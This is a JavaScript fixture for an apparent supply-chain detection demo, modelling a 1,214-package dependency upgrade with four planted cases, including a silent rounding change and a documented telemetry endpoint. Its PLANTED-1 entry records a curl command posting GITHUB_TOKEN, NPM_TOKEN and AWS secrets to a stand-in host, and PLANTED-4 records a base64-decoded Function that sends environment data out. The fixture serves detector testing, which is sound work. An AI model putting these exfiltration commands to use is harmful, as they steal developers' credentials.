/**
 * The demo dependency tree.
 *
 * A real project's tree is 500–3,000 packages. This is a stand-in of that shape: overwhelmingly
 * boring, with a handful of things worth finding — which is the honest ratio and the reason the
 * interface is built around silence rather than around findings.
 *
 * Three of these are planted, and the repository says so. A detection a reviewer cannot reproduce
 * is a magic trick, and the point of this project is the opposite of a magic trick.
 *
 *   PLANTED-1  a real-world *class* of attack: credential read + exfiltration at import time.
 *              This mirrors the July 2026 pattern where payloads moved to module load after npm 12
 *              disabled install scripts by default.
 *   PLANTED-2  silent breakage: no new behaviour at all, but the computation changed. The kind of
 *              thing a green test suite sails past.
 *   PLANTED-4  a decoder rather than a payload: a base64 blob becomes a function, and only then
 *              touches the network. The half that matters never becomes a syscall, so this one is
 *              caught by `nodert` and missed by eBPF — detection depends on which strategy watched.
 *
 *   PLANTED-3  a legitimate new endpoint, documented in the package's own changelog. The hard
 *              negative: a tool that flags this is a tool people will turn off.
 */

const TOTAL = 1214;

/** Packages whose version actually moved in this upgrade. The rest are unchanged and not re-run. */
const CHANGED = [
  { pkg: 'money-fmt', from: '2.4.1', to: '2.4.2', planted: 'PLANTED-2' },
  { pkg: 'stream-utils', from: '1.9.0', to: '1.9.1' },
  { pkg: 'tiny-glob', from: '0.2.8', to: '0.2.9' },
  { pkg: 'date-parse', from: '4.1.0', to: '4.2.0' },
  { pkg: 'color-convert', from: '2.0.1', to: '2.0.2' },
  { pkg: 'fast-levenshtein', from: '3.0.0', to: '3.0.1' },
  { pkg: 'node-fetch-retry', from: '2.1.4', to: '2.2.0', planted: 'PLANTED-3' },
  { pkg: 'is-plain-object', from: '5.0.0', to: '5.0.1' },
  { pkg: 'lru-memo', from: '7.3.2', to: '7.4.0' },
  { pkg: 'express-fileupload', from: '2.1.0', to: '2.1.1', planted: 'PLANTED-1' },
  { pkg: 'semver-compare', from: '1.0.0', to: '1.0.1' },
  { pkg: 'mime-types', from: '2.1.35', to: '2.1.36' },
  { pkg: 'deep-equal', from: '2.2.3', to: '2.2.4' },
  { pkg: 'yocto-queue', from: '1.0.0', to: '1.1.0' },
  { pkg: 'flat-config', from: '3.2.0', to: '3.2.1', planted: 'PLANTED-4' },
];

/**
 * What each version actually does when installed and imported.
 * Anything not listed here does nothing observable, which is true of almost every package.
 */
const BEHAVIOUR = {
  // ── PLANTED-1: credential theft at import time ────────────────────────────
  'express-fileupload@2.1.0': {},
  'express-fileupload@2.1.1': {
    env: ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_SECRET_ACCESS_KEY'],
    dns: ['cdn-assets-delivery.workers.dev'],
    net: [{ host: 'cdn-assets-delivery.workers.dev', port: 443, proto: 'tcp' }],
    proc: [{ argv: ['/bin/sh', '-c', 'curl -s -X POST -d @- https://cdn-assets-delivery.workers.dev/c'] }],
    importMs: 340,
  },

  // ── PLANTED-4: the payload is not in the source ───────────────────────────
  // A decoder, not a payload. It reaches the network in the end, but the interesting half — a
  // string becoming a function — never becomes a syscall, so eBPF sees a socket open and nothing
  // that explains it. `nodert` sees the construction. This is the one plant whose detection
  // depends on WHICH strategy watched, which is why every transcript carries its strategy.
  'flat-config@3.2.0': {},
  'flat-config@3.2.1': {
    exec: [
      { how: 'base64-decode', sample: '2048 chars' },
      { how: 'Function', sample: 'return (async()=>{const r=await fetch(atob(h)+"/r?k="+process.env' },
    ],
    dns: ['telemetry-edge.pages.dev'],
    net: [{ host: 'telemetry-edge.pages.dev', port: 443, proto: 'tcp' }],
    importMs: 96,
  },

  // ── PLANTED-3: a documented new endpoint. Must NOT be treated as an attack ──
  'node-fetch-retry@2.1.4': {},
  'node-fetch-retry@2.2.0': {
    dns: ['api.node-fetch-retry.dev'],
    net: [{ host: 'api.node-fetch-retry.dev', port: 443, proto: 'tcp' }],
    importMs: 28,
  },

  // ── ordinary, boring, real ────────────────────────────────────────────────
  'tiny-glob@0.2.9': { fs: [{ path: '/app/node_modules/.cache/tiny-glob/index.json', op: 'write' }] },
  'lru-memo@7.4.0': { fs: [{ path: '/app/node_modules/.cache/lru-memo/store.bin', op: 'write' }] },
};

/**
 * PLANTED-2 is invisible to behavioural observation on purpose: `money-fmt` changed its default
 * rounding mode. Nothing new is touched, nothing new is called — the *computation* changed. It is
 * caught by the invariant probe, not by the transcript, and it is here to make the point that
 * behaviour-watching is not sufficient on its own and the project does not pretend otherwise.
 */
const { run: invariantRun } = require('./probe/invariant-totals');

// Computed, not written down. The first version of this file quoted "228/500", which was a number
// somebody made up — and in a project whose argument is that a detection you cannot reproduce is a
// magic trick, that was the worst possible place to put one. Running it gives 5/500: exact
// half-cents are rare in floating point, so HALF_EVEN and HALF_UP disagree less often than you
// would guess. Five orders in five hundred, silently wrong, with the test suite green.
const invariant = invariantRun();

const INVARIANT_FAILURES = {
  'money-fmt@2.4.2': {
    probe: 'node probe/invariant-totals.js',
    output: `${invariant.drifted}/${invariant.total} orders drifted by +0.01   INVARIANT VIOLATED`,
    note: 'Rounding mode changed from HALF_EVEN to HALF_UP in a patch release. The test suite passes.',
  },
};

/** What the open web says about each finding — the Tavily step, recorded for the demo. */
const PUBLIC_RECORD = {
  'flat-config@3.2.1': {
    changelog: null,
    advisory: null,
    mentions: 1,
    // The distinguishing detail. Somebody noticed the bundle grew and asked about it; nobody
    // answered. That is not proof of anything, and it is exactly the kind of thing a human should
    // see next to a finding rather than a week later.
    verdict: 'One mention: an unanswered issue asking why the bundle grew 40 KB in a patch release.',
    sources: ['https://github.com/example/flat-config/issues/211'],
  },
  'express-fileupload@2.1.1': {
    changelog: null,
    advisory: null,
    mentions: 0,
    verdict: 'Nothing on the open web mentions that host.',
  },
  'node-fetch-retry@2.2.0': {
    changelog: 'v2.2.0 — adds optional telemetry for retry statistics, opt-out via NO_TELEMETRY=1',
    advisory: null,
    mentions: 14,
    verdict: 'Documented by the maintainer in the release notes.',
  },
  'money-fmt@2.4.2': {
    changelog: 'v2.4.2 — bug fixes',
    advisory: null,
    mentions: 2,
    verdict: 'The changelog says "bug fixes" and does not mention rounding.',
  },
};

function behaviourFor(pkg, version) {
  return BEHAVIOUR[`${pkg}@${version}`] || {};
}

module.exports = { TOTAL, CHANGED, BEHAVIOUR, INVARIANT_FAILURES, PUBLIC_RECORD, behaviourFor };
